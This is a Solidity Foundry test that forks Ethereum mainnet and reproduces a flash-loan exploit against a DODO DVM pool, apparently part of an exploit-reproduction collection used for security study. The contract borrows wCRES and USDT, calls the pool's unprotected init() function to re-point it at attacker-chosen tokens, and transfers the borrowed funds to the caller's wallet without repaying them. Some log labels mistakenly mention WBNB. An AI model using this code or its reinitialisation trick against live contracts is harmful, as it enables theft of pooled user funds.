// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is DSTest {
  uint256 wCRES_amount = 130000000000000000000000;

  uint256 usdt_amount = 1100000000000;

  IERC20 wCRES_token = IERC20(0xa0afAA285Ce85974c3C881256cB7F225e3A1178a);

  USDT usdt_token = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
  address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
  DVM dvm = DVM(0x051EBD717311350f1684f89335bed4ABd083a2b6);
  address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
  uint256 lpFeeRate = 3000000000000000;
  address mywallet = msg.sender;
  uint256 i = 1;
  uint256 k = 1000000000000000000;
  bool isOpenTWAP = false;
  address token1 = 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8;
  address token2 = 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("mainnet", 12000000); // fork mainnet block number 12000000
  }

  function testExploit() public {
    address me = address(this);
    dvm.flashLoan(wCRES_amount, usdt_amount, me, "whatever");

    //emit log_named_uint("Exploit completed, WBNB Balance",wbnb.balanceOf(mywallet));
  }

  function DVMFlashLoanCall(
    address a,
    uint256 b,
    uint256 c,
    bytes memory d
  ) public {
    emit log_named_uint(
      "FlashLoan WBNB Balance",
      wCRES_token.balanceOf(address(this))
    );
    dvm.init(
      maintainer,
      token1,
      token2,
      lpFeeRate,
      mtFeeRateModel,
      i,
      k,
      isOpenTWAP
    );
    wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));
    usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));

    emit log_named_uint(
      "After Exploit completed, wCRES Balance",
      wCRES_token.balanceOf(mywallet)
    );
    usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
    emit log_named_uint(
      "After Exploit completed, USDT Balance",
      usdt_token.balanceOf(mywallet)
    );
  }
}
